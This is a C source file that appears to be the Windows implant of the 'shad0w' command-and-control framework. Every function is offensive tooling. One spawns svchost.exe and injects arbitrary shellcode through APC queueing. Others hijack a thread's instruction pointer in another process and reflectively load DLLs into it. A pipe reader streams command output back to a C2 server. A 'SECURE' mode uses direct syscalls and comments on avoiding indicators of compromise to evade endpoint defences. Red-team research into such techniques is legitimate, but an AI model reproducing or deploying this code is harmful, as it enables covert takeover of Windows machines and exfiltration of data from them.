#define WIN32_LEAN_AND_MEAN

// kind of important 

#include <ntdef.h>
#include <stdio.h>
#include <stdlib.h>
#include <lmcons.h>
#include <windows.h>
#include <winbase.h>
#include <wtsapi32.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <versionhelpers.h>
#include <processthreadsapi.h>

// our local stuff

#include "loader.h"
#include "settings.h"
#include "syscalls.h"
#include "ReflectiveLoader.h"

#define MAX_OUTPUT 1000
#define IDLE_KILL_TIME 60
SYSTEMTIME start_time, current_time;

void ReadFromPipe(HANDLE g_hChildStd_OUT_Rd) 
{ 
   char chBuf[MAX_OUTPUT + 1];
   DWORD dwRead, rOpCode; 
   BOOL bSuccess = FALSE;
   
   do {
        // set the current timestamp
        GetLocalTime(&start_time);

        // read the data from the pipe
        bSuccess = ReadFile( g_hChildStd_OUT_Rd, chBuf, MAX_OUTPUT, &dwRead, NULL);
        
        // send the data to shad0w c2
        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, 
                         &rOpCode, (char*)chBuf, DATA_CMD_OUT, dwRead);
        
        // clean up the old buffer
        memset(chBuf, '\0', sizeof(chBuf));
   } while (TRUE);
   
   return;
}

void ProcessWatch(HANDLE pHandle)
// not currently in use as is way to cpu intensive
{
    while (TRUE)
    {
        // check if there has been any output read yet
        if (start_time.wSecond != 0)
        {
            // if no data has been read in the last 5 seconds
            GetLocalTime(&current_time);
            if ((current_time.wSecond - start_time.wSecond) >= IDLE_KILL_TIME)
            {
                // kill the process
                TerminateProcess(pHandle, 1);
                DEBUG("killed idle process");
                return;
            }
            
        }
    }
    
}

HANDLE GetThread(DWORD dwPid)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    HANDLE hThread;
    DWORD threadId = 0;
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

    BOOL bResult = Thread32First(hSnapshot, &threadEntry);
	while (bResult)
	{
		bResult = Thread32Next(hSnapshot, &threadEntry);
		if (bResult)
		{
			if (threadEntry.th32OwnerProcessID == dwPid)
			{
				threadId = threadEntry.th32ThreadID;
                #ifndef SECURE
				    hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT | THREAD_GET_CONTEXT, FALSE, threadId);
                #endif

                #ifdef SECURE
                    CLIENT_ID uTid = { 0 };
                    struct NtInfo NtdllInfo;
                    struct Syscalls rSyscall;
                    OBJECT_ATTRIBUTES ObjectAttributes;

                    // init the attributes
                    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

                    // set the correct pid and tid
                    uTid.UniqueProcess = (HANDLE)dwPid;
                    uTid.UniqueThread  = (HANDLE)threadId;

                    // populate our syscall and ntdll structs
                    ParseNtdll(&NtdllInfo, &rSyscall);

                    MakeSyscall("NtOpenThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
                    rSyscall.NtOpenThread(&hThread, PROCESS_ALL_ACCESS, &ObjectAttributes, &uTid);
                    CleanSyscall(SyscallStub);
                #endif

                break;
			}
		}
	}

	CloseHandle(hSnapshot);

    return hThread;
}

BOOL SpawnCode(CHAR* Bytes, SIZE_T Size)
{
    /*
    Run user supplied code and send all the output back to them
    */
    
    DWORD pol;
    DWORD threadId;
    HANDLE tHandle;
    HANDLE hProcess;
    SIZE_T tSize = 0;
    ULONG oProc, nProc;

    HANDLE g_hChildStd_IN_Rd = NULL;
    HANDLE g_hChildStd_IN_Wr = NULL;
    HANDLE g_hChildStd_OUT_Rd = NULL;
    HANDLE g_hChildStd_OUT_Wr = NULL;

    SECURITY_ATTRIBUTES saAttr; 

    // Set the bInheritHandle flag so pipe handles are inherited. 
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL;

    // need these so we can use the correct syscalls
    OSVERSIONINFOEXW osInfo;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

    // resolve so we can use this later to identify what syscall we need
    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");

    // create a pipe to get the stdout 
    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
    {
        DEBUG(TEXT("StdoutRd CreatePipe")); 
    }

    // ensure the read handle to the pipe for stdout is not inherited.
    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        DEBUG(TEXT("Stdout SetHandleInformation"));
    }

    // create a pipe for the child process's stdin.
    if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
    {
        DEBUG(TEXT("Stdin CreatePipe")); 
    }

    // ensure the write handle to the pipe for stdin is not inherited. 
    if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
    {
        DEBUG(TEXT("Stdin SetHandleInformation"));
    }

    // define our startup info
    STARTUPINFOEXA sInfo;
    BOOL bSuccess = FALSE;
    PROCESS_INFORMATION pInfo; 

    // zero out the structures
    ZeroMemory( &sInfo, sizeof(sInfo) );
    ZeroMemory( &pInfo, sizeof(PROCESS_INFORMATION) );

    // change the std values to our pipes
    sInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA); 
    sInfo.StartupInfo.hStdError = g_hChildStd_OUT_Wr;
    sInfo.StartupInfo.hStdOutput = g_hChildStd_OUT_Wr;
    sInfo.StartupInfo.hStdInput = g_hChildStd_IN_Rd;
    sInfo.StartupInfo.dwFlags = STARTF_USESTDHANDLES | EXTENDED_STARTUPINFO_PRESENT;

    // get the os info so we can use the correct syscall number
    RtlGetVersion(&osInfo);

    // start the thread to read from the stdout pipe
    CreateThread(NULL, 0, ReadFromPipe, g_hChildStd_OUT_Rd, 0, &threadId);

    #ifdef SECURE
        // get the size of the list
        InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &tSize);

        // alloc the memory for it
        sInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(tSize);

        // now put the attributes in
        InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &tSize);

        DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

        // now update our attributes
        UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
    #endif

    // use syscalls if we are in secure mode
    #ifdef SECURE
        DEBUG("doing secure exec");

        // bit of a race condition but the syscalls let us win it :)
        // spawning svchost suspended could be an ioc so thats why we are not doing that.
        // MAYBE: spawn svchost.exe with a different ppid an jus start it running
        CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);

        LPVOID rBuffer = NULL;
        struct NtInfo NtdllInfo;
        struct Syscalls rSyscall;
        SIZE_T uSize = (SIZE_T)Size;

        ParseNtdll(&NtdllInfo, &rSyscall);

        // alloc the memory we need inside the process
        MakeSyscall("NtAllocateVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
        rSyscall.NtAllocateVirtualMemory(pInfo.hProcess, &rBuffer, 0, &uSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
        CleanSyscall(SyscallStub);

        // write our shellcode bytes to the process
        MakeSyscall("NtWriteVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
        rSyscall.NtWriteVirtualMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);
        CleanSyscall(SyscallStub);

        // change the permisions on the memory so we can execute it
        MakeSyscall("NtProtectVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
        rSyscall.NtProtectVirtualMemory(pInfo.hProcess, &rBuffer, &uSize, PAGE_EXECUTE_READWRITE, &oProc);
        CleanSyscall(SyscallStub);

        // execute the code inside the process
        MakeSyscall("NtQueueApcThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
        rSyscall.NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
        CleanSyscall(SyscallStub);
    #endif

    // use straight api calls if we are not in secure mode
    #ifndef SECURE
        DEBUG("doing insecure exec");

        LPVOID rBuffer;

        // create a suspended svchost
        CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);

        // alloc + write bytes + queue
        rBuffer = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, Size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(pInfo.hProcess, rBuffer, (LPVOID)Bytes, Size, NULL);
        QueueUserAPC((PAPCFUNC)rBuffer, pInfo.hThread, NULL);

        // start the thread
        ResumeThread(pInfo.hThread);
        CloseHandle(pInfo.hThread);

    #endif

    // clean up a bit
    ZeroMemory(Bytes, Size);

    return;
}

BOOL InjectCode(CHAR* Bytes, SIZE_T Size, DWORD PID)
{
    /*
       Inject code into a given process, this will stop the process
       from continuing its execution flow by forcing rip to point to the
       start of our code. use with caution, likely to crash the remote process
    */

    DEBUG("InjectCode (%d) -> %d", Size, PID);

    HANDLE  rThread, hProcess;

    PULONG  pSus    = 0;
    LPVOID  rBuffer = NULL;
    CONTEXT ctx     = { 0 };

    #ifdef SECURE
        // use syscalls an careful how we alloc memory

        ULONG oProc, nProc;
        CLIENT_ID uPid = { 0 };
        struct NtInfo NtdllInfo;
        struct Syscalls rSyscall;
        SIZE_T uSize = (SIZE_T)Size;
        OBJECT_ATTRIBUTES ObjectAttributes;

        // init the attributes
        InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

        // set the correct pid
        uPid.UniqueProcess = (HANDLE)PID;
        uPid.UniqueThread = NULL;

        // populate our syscall and ntdll structs
        ParseNtdll(&NtdllInfo, &rSyscall);

        MakeSyscall("NtOpenProcess", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
        rSyscall.NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
        CleanSyscall(SyscallStub);

        // alloc the memory we need inside the process
        MakeSyscall("NtAllocateVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
        rSyscall.NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &uSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
        CleanSyscall(SyscallStub);

        // write our shellcode bytes to the process
        MakeSyscall("NtWriteVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
        rSyscall.NtWriteVirtualMemory(hProcess, rBuffer, Bytes, Size, NULL);
        CleanSyscall(SyscallStub);

        // change the permisions on the memory so we can execute it
        MakeSyscall("NtProtectVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
        rSyscall.NtProtectVirtualMemory(hProcess, &rBuffer, &uSize, PAGE_EXECUTE_READWRITE, &oProc);
        CleanSyscall(SyscallStub);

        // find any thread in the process
        rThread = GetThread(PID);

        // suspend the thread
        MakeSyscall("NtSuspendThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
        rSyscall.NtSuspendThread(rThread);
        CleanSyscall(SyscallStub);

        // detail our context
        ctx.ContextFlags = CONTEXT_FULL;

        // get the current context of the thread
        MakeSyscall("NtGetContextThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
        rSyscall.NtGetContextThread(rThread, &ctx);
        CleanSyscall(SyscallStub);

        // set the new address of rip
        ctx.Rip = (DWORD64)rBuffer;
        MakeSyscall("NtSetContextThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
        rSyscall.NtSetContextThread(rThread, &ctx);
        CleanSyscall(SyscallStub);

        // start the thread executing again
        MakeSyscall("NtResumeThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
        rSyscall.NtResumeThread(rThread);
        CleanSyscall(SyscallStub);

    #endif

    #ifndef SECURE
        // use winapi & PAGE_EXECUTE_READWRITE if we are not in secure mode

        // get a handle on the process
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

        // alloc memory in the process & write the code to it
        rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);

        // find a thread in the process an suspend it
        rThread = GetThread(PID);
        SuspendThread(rThread);

        // // get the current context of the thread
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(rThread, &ctx);

        // set the new address of rip
        ctx.Rip = (DWORD64)rBuffer;
        DWORD stat = SetThreadContext(rThread, &ctx);

        // start the thread executing again
        ResumeThread(rThread);
    #endif

    // resolve the address of NtAlertResumeThread
    _NtAlertResumeThread NtAlertResumeThread = (_NtAlertResumeThread)GetProcAddress(LoadLibrary("ntdll.dll"), "NtAlertResumeThread");

    // honestly not sure why i need to do this, guess windows is just weird ¯\_(ツ)_/¯
    NtAlertResumeThread(rThread, pSus);

    return TRUE;
}

BOOL InjectDLL(CHAR* Bytes, SIZE_T Size, DWORD PID)
{
    /*
    Inject a DLL into a process using the ThreadContinue method by @zerosum0x0.
    This will allow us to keep the process running just with our code running in a
    separate thread, its essentially CreateRemoteThread without the but using
    NtSetContextThread/SetThreadContext instead.
    */

    DEBUG("InjectDLL (%d) -> %d", Size, PID);

    HANDLE  rThread, hProcess;

    PULONG  pSus       = 0;
    LPVOID  rBuffer    = NULL;
    CONTEXT ctx        = { 0 };
    PVOID   pRemoteCtx = NULL;
    SIZE_T  nBytes     = 0;

    // get the offset
    DWORD dwOffset = GetReflectiveLoaderOffset(Bytes);

    // get a handle on the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    // alloc memory in the process & write the dll to it
    rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);

    // find any thread in the process an suspend it
    rThread = GetThread(PID);
    SuspendThread(rThread);

    // get the current context of the thread
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(rThread, &ctx);

    // write the ctx to a cave
    pRemoteCtx = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    WriteProcessMemory(hProcess, pRemoteCtx, &ctx, sizeof(ctx), NULL);

    // set up the new context
    ctx.Rip = (DWORD64)rBuffer + dwOffset;
	ctx.Rcx = (DWORD64)pRemoteCtx;

    // get the
    WriteProcessMemory(hProcess, (LPVOID)(((LPBYTE)rBuffer) + 2), &ctx.Rcx, sizeof(ctx.Rcx), &nBytes);

    // have room for the stack to grow
    ctx.Rsp = ctx.Rsp - 0x2000;

    // write the updated context
    DWORD stat = SetThreadContext(rThread, &ctx);

    // start the thread executing again
    ResumeThread(rThread);

    // resolve the address of NtAlertResumeThread
    _NtAlertResumeThread NtAlertResumeThread = (_NtAlertResumeThread)GetProcAddress(LoadLibrary("ntdll.dll"), "NtAlertResumeThread");

    // honestly not sure why i need to do this, guess windows is just weird ¯\_(ツ)_/¯
    NtAlertResumeThread(rThread, pSus);
}
